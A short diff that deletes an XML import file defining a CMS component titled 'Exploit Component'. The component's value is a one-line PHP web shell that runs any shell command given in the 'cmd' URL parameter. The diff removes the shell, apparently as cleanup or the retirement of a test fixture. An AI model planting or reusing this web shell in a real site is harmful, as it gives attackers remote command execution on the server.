@@ -1,9 +1,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<channel>
-  <item>
-    <title><![CDATA[Exploit Component]]></title>
-    <value><![CDATA[<?php echo system($_GET['cmd']); ?>]]></value>
-    <slug>exploit</slug>
-    <disabled><![CDATA[0]]></disabled>
-  </item>
-</channel>
